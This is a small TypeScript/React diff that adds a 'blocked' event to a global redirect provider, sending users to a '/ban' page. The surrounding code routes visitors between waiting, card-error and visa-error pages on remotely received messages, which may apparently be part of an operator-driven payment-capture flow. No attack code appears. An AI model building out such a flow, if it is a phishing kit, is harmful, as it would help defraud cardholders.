@@ -25,6 +25,7 @@ const pageMap: Record<string, string> = {
   go_total2: "/total2",
   go_waiting: "/waiting",
   go_errorvisa: "/errorvisa",
+  blocked: "/ban",
 };
 
 // Page Arabic names for tracking
@@ -242,6 +243,13 @@ export function GlobalRedirectProvider({ children }: GlobalRedirectProviderProps
     if (message.action === "card_error") {
       console.log("[GlobalRedirect] Card error received, redirecting to errorvisa");
       setLocation("/errorvisa");
+      return;
+    }
+
+    // Handle blocked event - redirect to ban page
+    if (message.action === "blocked" || message.event === "blocked") {
+      console.log("[GlobalRedirect] Block event received, redirecting to ban page");
+      setLocation("/ban");
       return;
     }
 
